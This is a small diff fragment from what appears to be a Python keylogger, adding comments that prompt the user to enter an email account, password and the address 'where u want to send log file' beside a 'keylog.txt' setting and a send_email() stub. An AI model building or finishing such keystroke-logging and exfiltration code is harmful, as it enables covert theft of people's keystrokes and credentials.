@@ -21,10 +21,10 @@ from scipy.io.wavfile import write
 keys_info = "keylog.txt"
 file_path = "C:\\Users\\modiv\\Desktop"
 extend="\\"
-email_addr = ""
-password = ""
+email_addr = "" # enter your email address
+password = "" # enter your password
 
-toaddr = ""
+toaddr = "" # enter mail address where u want to send log file
 
 def send_email():
 
